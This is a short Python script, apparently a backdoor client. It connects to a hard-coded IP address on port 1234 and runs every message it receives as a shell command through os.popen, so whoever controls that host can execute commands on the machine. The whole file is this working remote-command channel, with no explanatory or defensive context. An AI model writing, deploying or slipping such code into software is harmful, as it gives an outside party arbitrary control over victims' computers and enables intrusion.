import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '192.168.235.134'

s.connect((ip, 1234))

while True:
        msg = s.recv(1024)
        os.popen(msg.decode('utf-8'))
        s.send('Client is Online ...'.encode('utf-8'))
